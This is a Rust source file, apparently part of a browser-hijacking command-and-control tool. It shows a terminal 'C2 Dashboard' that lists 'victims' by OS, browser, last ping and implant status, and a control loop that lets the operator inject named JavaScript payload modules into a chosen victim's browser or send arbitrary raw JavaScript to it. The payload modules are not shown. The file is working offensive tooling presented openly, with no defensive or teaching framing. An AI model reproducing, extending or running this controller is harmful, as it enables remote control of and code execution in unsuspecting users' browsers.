use anyhow::Result;
use crate::victim::{Victim, Victims};
use crate::payloads::MODULES;
use tokio::io::{AsyncBufReadExt, BufReader};

const COLOR_GREEN: &str = "\x1b[32m";
const COLOR_RED: &str = "\x1b[31m";
const COLOR_RESET: &str = "\x1b[0m";
const CLEAR_SCREEN: &str = "\x1b[2J\x1b[H";

pub async fn dashboard_and_control(victims: Victims) -> Result<()> {
    let stdin = BufReader::new(tokio::io::stdin());
    let mut lines = stdin.lines();

    loop {
        print!("{}", CLEAR_SCREEN);
        println!("==== Rust C2 Dashboard ====");

        let snapshot = {
            let victims = victims.lock().unwrap();
            victims.iter()
                .map(|(id, v)| {
                    let elapsed = v.last_ping.lock().unwrap().elapsed().as_secs();
                    let os = v.os.lock().unwrap().clone().unwrap_or_else(|| "Unknown".to_string());
                    let browser = v.browser.lock().unwrap().clone().unwrap_or_else(|| "Unknown".to_string());
                    let implanted = *v.implanted.lock().unwrap();
                    (*id, elapsed, os, browser, implanted)
                })
                .collect::<Vec<_>>()
        };

        for (id, elapsed, os, browser, implanted) in snapshot {
            let status = if elapsed < 15 {
                format!("{}Alive{}", COLOR_GREEN, COLOR_RESET)
            } else {
                format!("{}Dead?{}", COLOR_RED, COLOR_RESET)
            };
            let implant_status = if implanted {
                format!("{}Implanted{}", COLOR_GREEN, COLOR_RESET)
            } else {
                "Normal".to_string()
            };
            println!("Victim-{} | Last Ping: {}s | Status: {} | Implant: {} | OS: {} | Browser: {}",
                id, elapsed, status, implant_status, os, browser);
        }

        println!("\n[*] Enter 'id' of Victim to control, or press ENTER to refresh dashboard:");

        let input = tokio::select! {
            _ = tokio::time::sleep(std::time::Duration::from_secs(5)) => None,
            res = lines.next_line() => res.ok().flatten(),
        };

        if let Some(cmd) = input {
            let trimmed = cmd.trim();
            if trimmed.is_empty() {
                continue;
            }
            if let Ok(id) = trimmed.parse::<u32>() {
if let Some(victim) = {
    let victims = victims.lock().unwrap();
    victims.get(&(id as usize)).cloned()
} {
    control_victim(victim).await?;
}
            }
        }
    }
}

async fn control_victim(victim: Victim) -> Result<()> {
    let stdin = BufReader::new(tokio::io::stdin());
    let mut lines = stdin.lines();

    println!("\n[*] Controlling Victim-{}. Type 'help' for commands. 'exit' to leave.", victim.id);

    while let Ok(Some(cmd)) = lines.next_line().await {
        let cmd = cmd.trim();
        match cmd {
            "exit" => break,
            "help" => {
                println!("Available Commands:");
                println!("  inject <module>  - Inject a payload module");
                println!("  list modules     - List available modules");
                println!("  send <raw_js>    - Send raw JavaScript");
            },
            c if c.starts_with("inject ") => {
                let module_name = c.trim_start_matches("inject ").trim();
                if let Some(js) = MODULES.get(module_name) {
                    victim.sender.send(js().to_string()).await?;
                    println!("[+] Injected module '{}'", module_name);
                } else {
                    println!("[-] Module not found.");
                }
            },
            "list modules" => {
                println!("[*] Available Modules:");
                for name in MODULES.keys() {
                    println!("  - {}", name);
                }
            },
            c if c.starts_with("send ") => {
                let raw_js = c.trim_start_matches("send ").trim();
                victim.sender.send(raw_js.to_string()).await?;
                println!("[+] Sent raw JavaScript.");
            },
            _ => {
                println!("[-] Unknown command. Type 'help' for available commands.");
            }
        }
    }
    Ok(())
}
